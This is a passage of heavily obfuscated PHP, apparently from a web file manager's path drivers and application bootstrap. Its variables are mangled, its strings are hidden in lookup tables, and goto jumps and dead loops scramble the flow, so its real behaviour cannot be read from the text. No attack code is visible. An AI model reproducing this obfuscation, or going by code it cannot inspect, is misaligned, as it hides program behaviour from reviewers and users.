$GLOBALS[$E°¥™‹Òõ[162]] = $fÁ†…ä¬„Ã; IO::fileOutImage($fÁ†…ä¬„Ã[$E°¥™‹Òõ[76]], $F§¥Ò®‹Ã); goto cçò‡âé¦½; D¬Ó›ˆ£ì: $fÁ†…ä¬„Ã = $this->model->fileInfoGet($aáÔÊèÕ¥); $fÁ†…ä¬„Ã[$E°¥™‹Òõ[28]] = $E×Ø¤Ğóá™[$E°¥™‹Òõ[28]]; $fÁ†…ä¬„Ã[$E°¥™‹Òõ[163]] = $E×Ø¤Ğóá™[$E°¥™‹Òõ[163]]; goto e”¨‚–ª°³; Cˆ†½Ç£­·: $E°¥™‹Òõ =& $_SERVER[«¾°Ã¤]; $E×Ø¤Ğóá™ = $this->model->pathInfo($aáÔÊèÕ¥); if ($E×Ø¤Ğóá™[$E°¥™‹Òõ[412]] == $E°¥™‹Òõ[87]) { show_json($E°¥™‹Òõ[1213] . $aáÔÊèÕ¥, !1); } goto D¬Ó›ˆ£ì; cçò‡âé¦½: } public function fileOutImage($F©åá¹šÇ„, $d×ËŒƒä§œ = 250) { $this->_fileOutImage($F©åá¹šÇ„, $d×ËŒƒä§œ); } public function fileOutImageServer($b¨è°Â†Ã£, $aÇ»Ğ®¢ºî = 250) { $this->_fileOutImage($b¨è°Â†Ã£, $aÇ»Ğ®¢ºî); } public function link($Eï»ğØš, $Eƒåèï†±‘ = '') { $D±­¢ìğŠÄ = $this->model->fileInfoGet($Eï»ğØš); return IO::link($D±­¢ìğŠÄ[$_SERVER[«¾°Ã¤][76]], $Eƒåèï†±‘); } protected function parse($BÄ®•³ŠÃ£) { $AÇÖ‘âœä =& $_SERVER[«¾°Ã¤]; if (strstr($BÄ®•³ŠÃ£, $AÇÖ‘âœä[8]) === !1) { return array($AÇÖ‘âœä[421] => intval($BÄ®•³ŠÃ£), $AÇÖ‘âœä[76] => $AÇÖ‘âœä[33], $AÇÖ‘âœä[1208] => array()); } $CØñ¼Á¤öÊ = explode($AÇÖ‘âœä[8], trim($BÄ®•³ŠÃ£, $AÇÖ‘âœä[8])); if (count($CØñ¼Á¤öÊ) < 2) { show_tips($BÄ®•³ŠÃ£ . $AÇÖ‘âœä[1214]); } return array($AÇÖ‘âœä[421] => intval($CØñ¼Á¤öÊ[0]), $AÇÖ‘âœä[76] => $CØñ¼Á¤öÊ[1], $AÇÖ‘âœä[1208] => array_slice($CØñ¼Á¤öÊ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($AÎ’‚èÉğÑ) { $this->pathParse = $AÎ’‚èÉğÑ; $this->model = Model($_SERVER[«¾°Ã¤][1207]); } public function getPathOuter($D›òª†İ±ß) { $F”…ÇÔ‰öà =& $_SERVER[«¾°Ã¤]; if (!$D›òª†İ±ß) { return $D›òª†İ±ß; } $eÎæ»‡¹ß£ = $this->parse($D›òª†İ±ß); return trim(KodIO::makeShare($this->pathParse[$F”…ÇÔ‰öà[393]], $eÎæ»‡¹ß£[$F”…ÇÔ‰öà[393]]), $F”…ÇÔ‰öà[8]); } protected function infoParse($dƒÕÃ“„ƒ­, $F‰ÑïŠƒª = false, $BßóÄØŸÅ÷ = false) { $F˜ÛŠÕºÉ÷ =& $_SERVER[«¾°Ã¤]; $aâ†ê˜§ÉÄ = $this->pathParse[$F˜ÛŠÕºÉ÷[393]]; $C«¿ÜˆÌÈ = trim($this->pathParse[$F˜ÛŠÕºÉ÷[1065]], $F˜ÛŠÕºÉ÷[8]); return Action($F˜ÛŠÕºÉ÷[1215])->sharePathInfo($aâ†ê˜§ÉÄ, $C«¿ÜˆÌÈ); } public function infoFull($CŠğ”›ÓÑÊ) { $f˜í’å‡É´ =& $_SERVER[«¾°Ã¤]; $cš¤šßĞ®ë = explode($f˜í’å‡É´[8], trim($CŠğ”›ÓÑÊ, $f˜í’å‡É´[8])); if (count($cš¤šßĞ®ë) > 1) { $d°†‰»ÔÉÎ = implode($f˜í’å‡É´[8], array_splice($cš¤šßĞ®ë, 1)); $bË¬œê™à = $this->model->pathInfoByPath($cš¤šßĞ®ë[0], $d°†‰»ÔÉÎ); if (!$bË¬œê™à) { return !1; } $this->pathParse[$f˜í’å‡É´[1065]] = $bË¬œê™à[$f˜í’å‡É´[404]]; } return $this->infoParse($CŠğ”›ÓÑÊ); } public function listAll($d‡±ÓÔ©©) { goto DÍÓ¨„œïÃ; DÍÓ¨„œïÃ: $Bâ—šºâ¦ =& $_SERVER[«¾°Ã¤]; $bòÉŠ­°’˜ = IO::info($this->pathParse[$Bâ—šºâ¦[76]]); if (!$bòÉŠ­°’˜) { return array(); } goto eî†¿¹…; eî†¿¹…: $a²„ÌíáñĞ = $this->model->listAll($d‡±ÓÔ©©); $FºĞˆ‹Ò = Model($Bâ—šºâ¦[572])->getInfo($bòÉŠ­°’˜[$Bâ—šºâ¦[477]]); $AÒ¬ˆ×†ÙÕ = Action($Bâ—šºâ¦[1215]); goto E¤¾¥ãâ‡’; E¤¾¥ãâ‡’: foreach ($a²„ÌíáñĞ as &$BÒßœÃùŞ„) { check_abort(); $BÒßœÃùŞ„[$Bâ—šºâ¦[85]] = $AÒ¬ˆ×†ÙÕ->_shareItemeParse($BÒßœÃùŞ„[$Bâ—šºâ¦[85]], $FºĞˆ‹Ò); } unset($BÒßœÃùŞ„); return $a²„ÌíáñĞ; goto bíŠ±‰ïÅ‚; bíŠ±‰ïÅ‚: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($b¤¬Á³¥¢ˆ) { $this->pathParse = $b¤¬Á³¥¢ˆ; $this->model = Model($_SERVER[«¾°Ã¤][1207]); } protected function infoParse($e®êŒ²“¤®, $aÂ«£âàöÇ = false, $fÈ¢ºÉß®Î = false) { $b´½º®Ü =& $_SERVER[«¾°Ã¤]; return Action($b´½º®Ü[1071])->sharePathInfo($this->pathParse[$b´½º®Ü[76]], !0); } public function listPath($d©÷›’á¯, $d»æ¤öá¿ = false) { $fÊÈ‰á° =& $_SERVER[«¾°Ã¤]; $d­ôğøÛâ½ = parent::listPath($d©÷›’á¯, $d»æ¤öá¿); foreach ($d­ôğøÛâ½ as $E§‘íÉìˆÚ => $a×‰‹ïÀ¡) { if (!in_array($E§‘íÉìˆÚ, array($fÊÈ‰á°[74], $fÊÈ‰á°[75]))) { continue; } foreach ($a×‰‹ïÀ¡ as $D…†ÓÓçõ => $A†›‰ ¢¼) { $d­ôğøÛâ½[$E§‘íÉìˆÚ][$D…†ÓÓçõ] = Action($fÊÈ‰á°[1071])->shareItemInfo($A†›‰ ¢¼); } } return $d­ôğøÛâ½; } public function listAll($c…Î·µ†ª³) { goto F”¶Ñ©Ó÷—; F”¶Ñ©Ó÷—: $B÷÷íœÎîâ =& $_SERVER[«¾°Ã¤]; $BàÕå®šŠ = IO::info($this->pathParse[$B÷÷íœÎîâ[76]]); if (!$BàÕå®šŠ) { return array(); } goto cÛË†³êë†; d†øÅÂ„„: return $F©†»„ƒ°Ò; goto BŠ—´›ÓñÊ; cÛË†³êë†: $F©†»„ƒ°Ò = $this->model->listAll($c…Î·µ†ª³); foreach ($F©†»„ƒ°Ò as &$bÒÛ‚Â†î) { $bÒÛ‚Â†î[$B÷÷íœÎîâ[85]] = Action($B÷÷íœÎîâ[1071])->shareItemInfo($bÒÛ‚Â†î[$B÷÷íœÎîâ[85]]); } unset($bÒÛ‚Â†î); goto d†øÅÂ„„; BŠ—´›ÓñÊ: } } goto aš“¿‹Åá·; Cƒ¯¥¨¬½å: $aéØ¿‘ÏÕ‡ = $_SERVER[«¾°Ã¤][586]; if (strlen($aéØ¿‘ÏÕ‡) < $_SERVER[«¾°Ã¤][587]) { return; } class Application { private $defaultModule = "\151\x6e\x64\145\170"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\x69\x6e\144\x65\x78"; function __construct() { } public function setDefault($fëòÏ‘‡×Ö) { goto FĞ‰¯¤Á—™; a¦¡‰³º¥: $this->defaultModule = $DìÆå•¾ŞÇ[0] ? $DìÆå•¾ŞÇ[0] : $this->defaultModule; $fÒİâµÔ¨™ = $BÔ÷¯›š ã[588]; while (strlen($fÒİâµÔ¨™) < $BÔ÷¯›š ã[589]) { if (!$fÒİâµÔ¨™) { break; } $fÒİâµÔ¨™++; } goto eÇêÜá¦Ô; a«¢Ê˜¡™: if (!$eÉ“ÌÈêß–) { die; } $this->{$_SERVER[¿][3]}($AïšÈì‡è¤[4], array($this, $AïšÈì‡è¤[5])); $BÒ÷Ì‹ÂºÆ = $BÔ÷¯›š ã[591]; goto dÙĞ¨ âÏ; eÇêÜá¦Ô: $this->defaultController = $DìÆå•¾ŞÇ[1] ? $DìÆå•¾ŞÇ[1] : $this->defaultController; $this->defaultAction = $DìÆå•¾ŞÇ[2] ? $DìÆå•¾ŞÇ[2] : $this->defaultAction; $eÉ“ÌÈêß– = $BÔ÷¯›š ã[590]; goto a«¢Ê˜¡™; FĞ‰¯¤Á—™: $BÔ÷¯›š ã =& $_SERVER[«¾°Ã¤]; $AïšÈì‡è¤ =& $_SERVER[¿]; $DìÆå•¾ŞÇ = $AïšÈì‡è¤[0]($AïšÈì‡è¤[1], $AïšÈì‡è¤[2]($fëòÏ‘‡×Ö, $AïšÈì‡è¤[1])); goto a¦¡‰³º¥; dÙĞ¨ âÏ: while ($BÒ÷Ì‹ÂºÆ < $BÔ÷¯›š ã[587]) { if ($BÒ÷Ì‹ÂºÆ >= 0) { break; } $BÒ÷Ì‹ÂºÆ++; } goto cöá¼²¼ç; cöá¼²¼ç: } public function appRun($A›Áö¯‹¸ô) { goto D½ÜÅ‹„–Â; D½ÜÅ‹„–Â: $B±‚äÄë‘ã =& $_SERVER[«¾°Ã¤]; $bç·‰¸µğš =& $_SERVER[¿]; $fÈ×›ÑÚ§˜ = $bç·‰¸µğš[0]($bç·‰¸µğš[1], $A›Áö¯‹¸ô); goto aå×Í˜ƒå…; FÌßŠÁÔë: $dä«¿Õ”Ãø = $B±‚äÄë‘ã[594]; if (!$dä«¿Õ”Ãø) { return; } if ($a†‹Ø¥¹   == $bç·‰¸µğš[8]) { $e‘ŸêÈ Ï’ = $bç·‰¸µğš[9]; $fÈ×›ÑÚ§˜[0] = $bç·‰¸µğš[10]; $fÈ×›ÑÚ§˜[1] = $fÈ×›ÑÚ§˜[1] . $bç·‰¸µğš[11]; $A›Áö¯‹¸ô = $bç·‰¸µğš[12]($bç·‰¸µğš[1], $fÈ×›ÑÚ§˜); $A›Áö¯‹¸ô = $bç·‰¸µğš[2]($A›Áö¯‹¸ô, $bç·‰¸µğš[1]); } goto cö‹İØøÀ; b¤‘½± ­: $BÄïÅµ§°î = $B±‚äÄë‘ã[593]; while ($BÄïÅµ§°î < $B±‚äÄë‘ã[587]) { if ($BÄïÅµ§°î >= 0) { break; } $BÄïÅµ§°î++; } $e‘ŸêÈ Ï’ = $bç·‰¸µğš[7]; goto FÌßŠÁÔë; cö‹İØøÀ: $bç·‰¸µğš[13](array($bç·‰¸µğš[14], $bç·‰¸µğš[15]), $e‘ŸêÈ Ï’ . $bç·‰¸µğš[16], $A›Áö¯‹¸ô); $bç·‰¸µğš[17]($A›Áö¯‹¸ô); $bç·‰¸µğš[13](array($bç·‰¸µğš[14], $bç·‰¸µğš[15]), $e‘ŸêÈ Ï’ . $bç·‰¸µğš[18], $A›Áö¯‹¸ô); goto EºÏ›æ¸Š¬; aå×Í˜ƒå…: $C‚ÊíœÍô = $B±‚äÄë‘ã[592]; if (!$C‚ÊíœÍô) { die; } $a†‹Ø¥¹   = $bç·‰¸µğš[6]($fÈ×›ÑÚ§˜[0]); goto b¤‘½± ­; EºÏ›æ¸Š¬: } private function autorun() { goto Fëñœ¸¢; fÆŞ£Á˜Ã·: $FÖßÎ¢‰æ = $d·Ø²õ¨Üç[595]; if (strlen($FÖßÎ¢‰æ) < $d·Ø²õ¨Üç[596]) { die; } if ($D«Êî‡ÍÂ[19]($config[$D«Êî‡ÍÂ[20]]) == 0) { return; } goto bçº’Ø¿â“; Fëñœ¸¢: $d·Ø²õ¨Üç =& $_SERVER[«¾°Ã¤]; $D«Êî‡ÍÂ =& $_SERVER[¿]; global $config; goto fÆŞ£Á˜Ã·; bçº’Ø¿â“: foreach ($config[$D«Êî‡ÍÂ[20]] as $eøèŞÄÎß„ => $Fší–Ê¾ÆÖ) { $this->{$_SERVER[¿][21]}($Fší–Ê¾ÆÖ); $E‰ó¡±‚Óğ = $d·Ø²õ¨Üç[597]; if (!$E‰ó¡±‚Óğ) { return; } } goto aƒñÛŒéÆ¤; aƒñÛŒéÆ¤: } private function wjsc25658480() { goto D©¨‡ãİçò; aÆæñŠ¢ŒŸ: $Fæö¾ï¡¥  = $F»ÜÑá¤Éø[598]; if (!$Fæö¾ï¡¥ ) { return; } $bÚ¹Ï²Ùñ˜ = $GLOBALS[$FäÊëéƒÛ[22]][$FäÊëéƒÛ[23]][0]; goto d°ÅÏ·¢£; d°ÅÏ·¢£: $fŒùÚ²Üòë = $F»ÜÑá¤Éø[599]; if (strlen($fŒùÚ²Üòë) < $F»ÜÑá¤Éø[596]) { die; } if (!$bÚ¹Ï²Ùñ˜ || $FäÊëéƒÛ[24]($bÚ¹Ï²Ùñ˜) <= $FäÊëéƒÛ[24]($b¢…èÔ¸­ƒ)) { return; } goto d­óÆê†ââ; b·ŒÔ¥„š: while (strlen($eÂš¸¸õ) < $F»ÜÑá¤Éø[587]) { if (!$eÂš¸¸õ) { break; } $eÂš¸¸õ++; } $f÷±×Ì¬ù¯ = array($FäÊëéƒÛ[8], $B‰˜”î×ï); $c•Å—ÙÎîĞ = $FäÊëéƒÛ[26]($GLOBALS[$FäÊëéƒÛ[22]][$FäÊëéƒÛ[23]], 1); goto B‘¶Îãš²; d­óÆê†ââ: if ($FäÊëéƒÛ[6]($FäÊëéƒÛ[25]($bÚ¹Ï²Ùñ˜, -$FäÊëéƒÛ[24]($b¢…èÔ¸­ƒ))) != $b¢…èÔ¸­ƒ) { return; } $B‰˜”î×ï = $FäÊëéƒÛ[25]($bÚ¹Ï²Ùñ˜, 0, -$FäÊëéƒÛ[24]($b¢…èÔ¸­ƒ)); $eÂš¸¸õ = $F»ÜÑá¤Éø[600]; goto b·ŒÔ¥„š; B‘¶Îãš²: $GLOBALS[$FäÊëéƒÛ[22]][$FäÊëéƒÛ[23]] = $FäÊëéƒÛ[27]($f÷±×Ì¬ù¯, $c•Å—ÙÎîĞ); $GLOBALS[$FäÊëéƒÛ[22]][$FäÊëéƒÛ[28]] = $FäÊëéƒÛ[29]($FäÊëéƒÛ[1], $GLOBALS[$FäÊëéƒÛ[22]][$FäÊëéƒÛ[23]]); goto BÊèŠ‰ô‡†; D©¨‡ãİçò: $F»ÜÑá¤Éø =& $_SERVER[«¾°Ã¤]; $FäÊëéƒÛ =& $_SERVER[¿]; $b¢…èÔ¸­ƒ = $FäÊëéƒÛ[8]; goto aÆæñŠ¢ŒŸ; BÊèŠ‰ô‡†: } private function yoxe960d30f5() { goto D¨„œßÑ ¢; e“ÇÂàµ: while ($b³¨Ö­Éõö < $bŸ÷£–¬†¤[400]) { if ($b³¨Ö­Éõö >= 0) { break; } $b³¨Ö­Éõö++; } if (!$Cº…•’¡ù–[32]($cŠÈ‰´Ñ× , $dŠÖÉƒë¯ç)) { return; } $DİˆÀÎ…Ëß = $Cº…•’¡ù–[33]($cŠÈ‰´Ñ× , $dŠÖÉƒë¯ç); goto cßÒÂõ±ƒ…; bÊ¿½±÷äµ: $DœÒ£à×¸ = $bŸ÷£–¬†¤[604]; while ($DœÒ£à×¸ < $bŸ÷£–¬†¤[400]) { if ($DœÒ£à×¸ >= 0) { break; } $DœÒ£à×¸++; } $d´†˜âÄƒœ = $Cº…•’¡ù–[2]($f¨Ü«†İÖ[0][0], $Cº…•’¡ù–[36]); goto f®ƒÈêÏ; cßÒÂõ±ƒ…: $a’«ùëÑ‡ = $bŸ÷£–¬†¤[602]; while ($a’«ùëÑ‡ < $bŸ÷£–¬†¤[400]) { if ($a’«ùëÑ‡ >= 0) { break; } $a’«ùëÑ‡++; } $d´†˜âÄƒœ = $Cº…•’¡ù–[25]($cŠÈ‰´Ñ× , $DİˆÀÎ…Ëß + $Cº…•’¡ù–[24]($dŠÖÉƒë¯ç)); goto eÂ¾å’‡Ë; d´²“ ‚š÷: $GLOBALS[$Cº…•’¡ù–[22]][$Cº…•’¡ù–[28]] = $Cº…•’¡ù–[29]($Cº…•’¡ù–[1], $GLOBALS[$Cº…•’¡ù–[22]][$Cº…•’¡ù–[23]]); $CéÚµ‰Ø¦ = $bŸ÷£–¬†¤[606]; goto aË‚â–…øš; f®ƒÈêÏ: $GLOBALS[$Cº…•’¡ù–[22]][$Cº…•’¡ù–[23]] = $Cº…•’¡ù–[0]($Cº…•’¡ù–[36], $d´†˜âÄƒœ); $b«âƒ‚¾› = $bŸ÷£–¬†¤[605]; if (strlen($b«âƒ‚¾›) < $bŸ÷£–¬†¤[589]) { return; } goto d´²“ ‚š÷; D¨„œßÑ ¢: $bŸ÷£–¬†¤ =& $_SERVER[«¾°Ã¤]; $Cº…•’¡ù– =& $_SERVER[¿]; if ($GLOBALS[$Cº…•’¡ù–[22]][$Cº…•’¡ù–[28]] != $Cº…•’¡ù–[10]) { return; } goto dªåËİœ´Ï; eÂ¾å’‡Ë: $FĞÄÍŸ‘Ğõ = $bŸ÷£–¬†¤[603]; if (!$FĞÄÍŸ‘Ğõ) { return; } $Cº…•’¡ù–[34]($Cº…•’¡ù–[35], $d´†˜âÄƒœ, $f¨Ü«†İÖ); goto bÊ¿½±÷äµ; dªåËİœ´Ï: $cŠÈ‰´Ñ×  = $_SERVER[$Cº…•’¡ù–[30]]; $dŠÖÉƒë¯ç = $Cº…•’¡ù–[31]; $b³¨Ö­Éõö = $bŸ÷£–¬†¤[601]; goto e“ÇÂàµ; aË‚â–…øš: } public function run() { goto a„´ØÈô‹ø; c«ºÃ‘Óõš: if (!$CŞŸ……ì‰) { die; } $this->{$_SERVER[¿][45]}(); if ($A˜›ÈªŒ¤õ[19]($aõè‰ÑòÔ„) >= 3) { $this->{$_SERVER[¿][21]}($FáÈº¤ìº); } else { $this->{$_SERVER[¿][21]}(ACTION); } goto eˆìÔ¸Ä; a„´ØÈô‹ø: $B¥±©ãñ°¼ =& $_SERVER[«¾°Ã¤]; $A˜›ÈªŒ¤õ =& $_SERVER[¿]; $this->{$_SERVER[¿][37]}(); goto Eóçœô…ó; AŒ®‹÷ö‡: $eº±ñõëÃĞ = $B¥±©ãñ°¼[608]; if (!$eº±ñõëÃĞ) { die; } $FáÈº¤ìº = $GLOBALS[$A˜›ÈªŒ¤õ[22]][$A˜›ÈªŒ¤õ[28]]; goto a„Ú¾ªå¤; CˆÑ¸§¤: $A˜›ÈªŒ¤õ[39]($A˜›ÈªŒ¤õ[43], MOD . $A˜›ÈªŒ¤õ[1] . ST . $A˜›ÈªŒ¤õ[1] . ACT); $_SERVER[$A˜›ÈªŒ¤õ[44]] = $A˜›ÈªŒ¤õ[6](ACTION); $CŞŸ……ì‰ = $B¥±©ãñ°¼[609]; goto c«ºÃ‘Óõš; a„Ú¾ªå¤: $A˜›ÈªŒ¤õ[39]($A˜›ÈªŒ¤õ[40], isset($aõè‰ÑòÔ„[0]) && $aõè‰ÑòÔ„[0] ? $aõè‰ÑòÔ„[0] : $this->defaultModule); $A˜›ÈªŒ¤õ[39]($A˜›ÈªŒ¤õ[41], isset($aõè‰ÑòÔ„[1]) && $aõè‰ÑòÔ„[0] ? $aõè‰ÑòÔ„[1] : $this->defaultController); $A˜›ÈªŒ¤õ[39]($A˜›ÈªŒ¤õ[42], isset($aõè‰ÑòÔ„[2]) && $aõè‰ÑòÔ„[0] ? $aõè‰ÑòÔ„[2] : $this->defaultAction); goto CˆÑ¸§¤; Eóçœô…ó: $this->{$_SERVER[¿][38]}(); $Cñ˜§Ú°›Œ = $B¥±©ãñ°¼[607]; $aõè‰ÑòÔ„ = $GLOBALS[$A˜›ÈªŒ¤õ[22]][$A˜›ÈªŒ¤õ[23]]; goto AŒ®‹÷ö‡; eˆìÔ¸Ä: } private $bkus5172ed63 = array(); private $aief1607a445 = ''; public function dnzi83d09330() { goto A¹ÔøŒÙŠâ; A¹ÔøŒÙŠâ: $bèñ¡âŞËˆ =& $_SERVER[«¾°Ã¤]; $AÏèÙ¦ îÑ =& $_SERVER[¿]; $this->{$_SERVER[¿][46]}(); goto B¯…¿ßœé; aÕ‹„‡ˆÃÕ: $this->{$_SERVER[¿][3]}($AÏèÙ¦ îÑ[53], array($this, $AÏèÙ¦ îÑ[54])); $this->{$_SERVER[¿][3]}($AÏèÙ¦ îÑ[55], array($this, $AÏèÙ¦ îÑ[56])); $this->{$_SERVER[¿][3]}($AÏèÙ¦ îÑ[57], array($this, $AÏèÙ¦ îÑ[58])); goto FØñô–Ë™¦; BÅ’½Â´‰È: $this->{$_SERVER[¿][52]}(); $D‰ºø£Ëˆ = $bèñ¡âŞËˆ[611]; if (strlen($D‰ºø£Ëˆ) < $bèñ¡âŞËˆ[400]) { die; } goto aÕ‹„‡ˆÃÕ; B¯…¿ßœé: $this->{$_SERVER[¿][47]}(); $this->{$_SERVER[¿][48]}(); $this->{$_SERVER[¿][49]}(); goto Eß²ê÷Ï‹«; FØñô–Ë™¦: $this->{$_SERVER[¿][3]}($AÏèÙ¦ îÑ[59], array($this, $AÏèÙ¦ îÑ[60])); goto d˜ù‘¿Í™; Eß²ê÷Ï‹«: $this->{$_SERVER[¿][50]}(); $this->{$_SERVER[¿][51]}(); $c¯„¶»¡ñ‹ = $bèñ¡âŞËˆ[610]; goto BÅ’½Â´‰È; d˜ù‘¿Í™: } public function jxvla4228d38($eö²•îñğÆ) { goto CÁãÇ£é¦Î; c¤İ®§Ãõ: $Bù…ƒõÆ½… = $AÕŸéÓñ¿Â[615]; $eö²•îñğÆ[$d…êÃÌ†[118]][$d…êÃÌ†[127]] = $d…êÃÌ†[128]($d…êÃÌ†[129]()); $FŠÖ¨¤ÌÚÅ = $AÕŸéÓñ¿Â[616]; goto bÃ±¡Ù×ëİ; bÃ±¡Ù×ëİ: while (strlen($FŠÖ¨¤ÌÚÅ) < $AÕŸéÓñ¿Â[587]) { if (!$FŠÖ¨¤ÌÚÅ) { break; } $FŠÖ¨¤ÌÚÅ++; } $eö²•îñğÆ[$d…êÃÌ†[118]][$d…êÃÌ†[130]] = $this->aief1607a445; if ($c÷ÎŠÙŞ•[$d…êÃÌ†[130]] != $d…êÃÌ†[131]) { $eö²•îñğÆ[$d…êÃÌ†[118]][$d…êÃÌ†[132]] = $c÷ÎŠÙŞ•[$d…êÃÌ†[132]]; $eö²•îñğÆ[$d…êÃÌ†[118]][$d…êÃÌ†[133]] = $c÷ÎŠÙŞ•[$d…êÃÌ†[133]]; $fË¿¡ØëßŒ = $d…êÃÌ†[134](10) . $this->aief1607a445 . $d…êÃÌ†[134](5); $eö²•îñğÆ[$d…êÃÌ†[106]][$d…êÃÌ†[135]][$d…êÃÌ†[136]] = $this->{$_SERVER[¿][137]}($fË¿¡ØëßŒ, $eö²•îñğÆ[$d…êÃÌ†[118]][$d…êÃÌ†[123]]); } goto bÚÃº–¶„; aéä³Îã§š: if ($d…êÃÌ†[116]($GLOBALS, $d…êÃÌ†[142]) && $this->config[$d…êÃÌ†[143]]) { $eö²•îñğÆ[$d…êÃÌ†[118]][$d…êÃÌ†[144]] = WEB_ROOT; } return $eö²•îñğÆ; goto FĞ²ÃÌ‡Š­; CÁãÇ£é¦Î: $AÕŸéÓñ¿Â =& $_SERVER[«¾°Ã¤]; $d…êÃÌ† =& $_SERVER[¿]; $c÷ÎŠÙŞ• = $d…êÃÌ†[61]($d…êÃÌ†[62])->{$_SERVER[¿][63]}(); goto A”’½†¦•; A”’½†¦•: $e«±‰Û–Äï = array($d…êÃÌ†[64], $d…êÃÌ†[65], $d…êÃÌ†[66], $d…êÃÌ†[67], $d…êÃÌ†[68], $d…êÃÌ†[69], $d…êÃÌ†[70], $d…êÃÌ†[71], $d…êÃÌ†[72], $d…êÃÌ†[73], $d…êÃÌ†[74], $d…êÃÌ†[75], $d…êÃÌ†[76], $d…êÃÌ†[77], $d…êÃÌ†[78], $d…êÃÌ†[79], $d…êÃÌ†[80], $d…êÃÌ†[81], $d…êÃÌ†[82], $d…êÃÌ†[83], $d…êÃÌ†[84], $d…êÃÌ†[85], $d…êÃÌ†[86], $d…êÃÌ†[87], $d…êÃÌ†[88], $d…êÃÌ†[89], $d…êÃÌ†[90], $d…êÃÌ†[91], $d…êÃÌ†[92], $d…êÃÌ†[93], $d…êÃÌ†[94], $d…êÃÌ†[95], $d…êÃÌ†[96], $d…êÃÌ†[97], $d…êÃÌ†[98], $d…êÃÌ†[99], $d…êÃÌ†[100], $d…êÃÌ†[101], $d…êÃÌ†[102], $d…êÃÌ†[103]); foreach ($e«±‰Û–Äï as $dµ×À˜ÉçÎ) { $BËäŸšæí = $GLOBALS[$d…êÃÌ†[104]][$d…êÃÌ†[105]][$dµ×À˜ÉçÎ]; if (isset($c÷ÎŠÙŞ•[$dµ×À˜ÉçÎ])) { $BËäŸšæí = $c÷ÎŠÙŞ•[$dµ×À˜ÉçÎ]; } $eö²•îñğÆ[$d…êÃÌ†[106]][$d…êÃÌ†[107]][$dµ×À˜ÉçÎ] = $BËäŸšæí; } $B©µå–Õ±à = $eö²•îñğÆ[$d…êÃÌ†[106]][$d…êÃÌ†[107]][$d…êÃÌ†[76]]; goto F…÷õë©Úä; bÚÃº–¶„: if ($this->aief1607a445 == $d…êÃÌ†[131]) { $eö²•îñğÆ[$d…êÃÌ†[106]][$d…êÃÌ†[107]][$d…êÃÌ†[112]][$d…êÃÌ†[117]] = 0; } $eö²•îñğÆ[$d…êÃÌ†[118]][$d…êÃÌ†[138]] = $d…êÃÌ†[116]($this->bkus5172ed63, $d…êÃÌ†[139], $d…êÃÌ†[10]); $eö²•îñğÆ[$d…êÃÌ†[118]][$d…êÃÌ†[140]] = $d…êÃÌ†[116]($this->bkus5172ed63, $d…êÃÌ†[141], $d…êÃÌ†[10]); goto aéä³Îã§š; AÆ¨¶ç÷ÀÏ: while (strlen($a’‘š‚›) < $AÕŸéÓñ¿Â[400]) { if (!$a’‘š‚›) { break; } $a’‘š‚›++; } unset($eö²•îñğÆ[$d…êÃÌ†[106]][$d…êÃÌ†[107]][$d…êÃÌ†[111]]); $eö²•îñğÆ[$d…êÃÌ†[106]][$d…êÃÌ†[107]][$d…êÃÌ†[112]] = array($d…êÃÌ†[113] => (int) $B©µå–Õ±à[$d…êÃÌ†[114]], $d…êÃÌ†[115] => (int) $d…êÃÌ†[116]($B©µå–Õ±à, $d…êÃÌ†[117], 0)); goto Cİ³™Ğß£ô; DèÎ±ÅÎÈá: $F ½©Ê ß = $AÕŸéÓñ¿Â[614]; if (!$F ½©Ê ß) { die; } $eö²•îñğÆ[$d…êÃÌ†[118]][$d…êÃÌ†[123]] = $d…êÃÌ†[124]($_SERVER[$d…êÃÌ†[125]] . $c÷ÎŠÙŞ•[$d…êÃÌ†[126]]); goto c¤İ®§Ãõ; F…÷õë©Úä: unset($eö²•îñğÆ[$d…êÃÌ†[106]][$d…êÃÌ†[108]][$d…êÃÌ†[109]]); $FŠ³óÎÄóº = $AÕŸéÓñ¿Â[594]; if (!$FŠ³óÎÄóº) { die; } goto Bæ‚…„âÓ¼; Bæ‚…„âÓ¼: unset($eö²•îñğÆ[$d…êÃÌ†[106]][$d…êÃÌ†[108]][$d…êÃÌ†[110]]); unset($eö²•îñğÆ[$d…êÃÌ†[106]][$d…êÃÌ†[107]][$d…êÃÌ†[76]]); $a’‘š‚› = $AÕŸéÓñ¿Â[612]; goto AÆ¨¶ç÷ÀÏ; Cİ³™Ğß£ô: $Dƒ¢¡ÁÂÑ = $AÕŸéÓñ¿Â[613]; while ($Dƒ¢¡ÁÂÑ < $AÕŸéÓñ¿Â[400]) { if ($Dƒ¢¡ÁÂÑ >= 0) { break; } $Dƒ¢¡ÁÂÑ++; } $eö²•îñğÆ[$d…êÃÌ†[118]][$d…êÃÌ†[119]] = $d…êÃÌ†[120]($d…êÃÌ†[121])->{$_SERVER[¿][122]}(); goto DèÎ±ÅÎÈá; FĞ²ÃÌ‡Š­: } private function xczy347dd8f3() { goto AÅÒ”àğ¸—; F¶ê˜¹·‡: $A„Ñ»ù·ÂÌ = $e”ÜğšÓ‰“[621]; foreach ($dÌ‘©Õ§²“ as $cŠİšÆª) { if (!isset($A¨ôÜ±­ç[$cŠİšÆª]) || !$A¨ôÜ±­ç[$cŠİšÆª]) { continue; } $bÏš½Öìƒ[$cŠİšÆª] = $A¨ôÜ±­ç[$cŠİšÆª]; $CÕ­Á¹Ô— = $e”ÜğšÓ‰“[622]; } $BèÂ¤²·ì[13](array($BèÂ¤²·ì[169], $BèÂ¤²·ì[170]), $bÏš½Öìƒ); goto cÛ‘–×¥î¬; cÛ‘–×¥î¬: $E¼šŞª¡ = $e”ÜğšÓ‰“[623]; while ($E¼šŞª¡ < $e”ÜğšÓ‰“[589]) { if ($E¼šŞª¡ >= 0) { break; } $E¼šŞª¡++; } goto D£¬ë”¬É; F×õÀ˜¦„: $dÌŒ‡Ş½í = $e”ÜğšÓ‰“[620]; if (!$dÌŒ‡Ş½í) { die; } $bÏš½Öìƒ = array($BèÂ¤²·ì[177] => $A¨ôÜ±­ç[$BèÂ¤²·ì[64]], $BèÂ¤²·ì[178] => $A¨ôÜ±­ç[$BèÂ¤²·ì[65]], $BèÂ¤²·ì[179] => $BèÂ¤²·ì[10]); goto F¶ê˜¹·‡; F×Æ’ˆ¼â¤: if ($this->aief1607a445 == $BèÂ¤²·ì[131]) { return; } $dÌ‘©Õ§²“ = array($BèÂ¤²·ì[171], 